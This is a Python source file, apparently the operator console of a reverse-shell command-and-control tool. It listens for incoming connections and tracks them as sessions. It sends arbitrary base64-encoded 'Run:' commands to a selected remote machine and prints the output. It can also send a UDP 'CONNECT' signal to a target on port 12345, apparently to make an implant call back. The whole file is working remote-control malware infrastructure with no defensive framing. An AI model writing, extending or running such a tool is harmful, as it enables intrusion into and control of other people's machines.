from socket import *
from threading import Thread
import time
import os
import sys
import base64

SessionStorage = {}

class Session:
    def connection(self:dict):
        try:
            s = socket(self["option1"], self["option2"])
            s.bind((self["ip"], self["port"]))
            try:
                s.listen()
                sock, addr = s.accept()
                return {"Session" : sock, "Address" : addr, "Time" : time.strftime("%Y-%m/%d-%T")}
            except:
                return False
        except:
            return False
    def receive(self:str):
        try:
            return base64.b64decode(SessionStorage[self]["Session"].recv(1048576)).decode()
        except:
            return False
    def send(self:str, data:bytes):
        try:
            data = base64.b64encode(data)
            SessionStorage[self]["Session"].send(data)
            return True
        except:
            return False
    def close(self:str):
        try:
            if self in SessionStorage:
                SessionStorage[self]["Session"].close()
                del SessionStorage[self]
                return True
        except:
            return False
    def closeall(self=None):
        for connection in list(SessionStorage):
            try:
                SessionStorage[connection]["Session"].close()
                del SessionStorage[connection]
            except:
                continue
    def isonline(self:str):
        try:
            return Session.send(self, "".encode())
        except:
            return False

class Handler:
    def Session_start(self:int):
        while True:
            try:
                Port = self
                SessionInformation = {
                    "ip": "",
                    "port": Port,
                    "option1": AF_INET,
                    "option2": SOCK_STREAM
                }
                session = Session.connection(SessionInformation)
                if not session == False:
                    SessionStorage[f"{session['Address'][0]}:{session['Address'][1]}"] = session
            except:
                pass
    def online(self=None):
        while True:
            for session in list(SessionStorage):
                if Session.isonline(session) == False:
                    Session.close(session)
    def cnt_number(self=None):
        try:
            idx = 0
            for session in list(SessionStorage):
                idx += 1
            return idx
        except:
            return False

Port = int(input("Enter the session port : "))

SessionHandler = Thread(target=Handler.Session_start, args=(Port,))
SessionHandler.daemon = True
SessionHandler.start()

SessionHandler = Thread(target=Handler.online)
SessionHandler.daemon = True
SessionHandler.start()

while True:
    try:
        command = input(f"<{gethostbyname(gethostname())} ({gethostname()}) : {Port}  [CNT : {Handler.cnt_number()}]>")
        if command.startswith("session"):
            if command == "session list":
                session_number = 0
                for session in SessionStorage:
                    session = SessionStorage[session]
                    session_number += 1
                    print(f"\tCnt {session_number}.\t[{session['Time']}]\t{session['Address'][0]}\t{session['Address'][1]}")
            elif command == "session online refresh":
                for session in list(SessionStorage):
                    if Session.isonline(session) == False:
                        Session.close(session)
            elif command.startswith("session cnt"):
                target = int(command[12:]) - 1
                if target + 1 > len(list(SessionStorage.keys())):
                    continue
                target = str(list(SessionStorage.keys())[target])
                if target in SessionStorage:
                    print(f"[+] Connecting to {target}...")
                    while True:
                        cmd = str(input(f"[{gethostbyname(gethostname())}:{Port} --> {target}]"))
                        if cmd == "exit":
                            break
                        if Session.send(target, f"Run:{cmd}".encode()) == True:
                            print(f"[+] Sending... [{cmd}]")
                            recv_data = Session.receive(target)
                            if recv_data == False:
                                print(f"[-] Failed to receive data from {target}")
                                print(f"[-] Exiting console...")
                                break
                            else:
                                print(recv_data)
                else:
                    print(f"[-] Target : {target} not in SessionStorage")
                    continue
        elif command.startswith("signal"):
            if command.startswith("signal cnt"):
                target = command[11:].split(" ")[0]

                print(f"Sending packet to {target}")
                udp = socket(AF_INET, SOCK_DGRAM)
                udp.sendto(f"CONNECT:::{gethostbyname(gethostname())}".encode(), (target, 12345))
        elif command == "exit":
            break
    except:
        pass

sys.exit(1)
